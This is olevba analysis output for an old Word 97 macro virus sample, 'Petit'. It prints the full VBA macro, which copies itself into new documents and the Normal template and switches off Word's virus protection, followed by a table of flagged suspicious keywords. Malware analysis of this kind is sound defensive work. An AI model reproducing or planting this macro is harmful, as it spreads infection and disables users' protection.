olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Petit-806f0689cc8a6f84f59d8c538da63c84d1dd1dfd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Petit-806f0689cc8a6f84f59d8c538da63c84d1dd1dfd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub AutoNew()
c = VBE.SelectedVBComponent.CodeModule.Lines(1, 13)
With Documents(1).VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString c
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString c
End With
Options.VirusProtection = 0
End Sub
'wm97.Petite by vlam
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

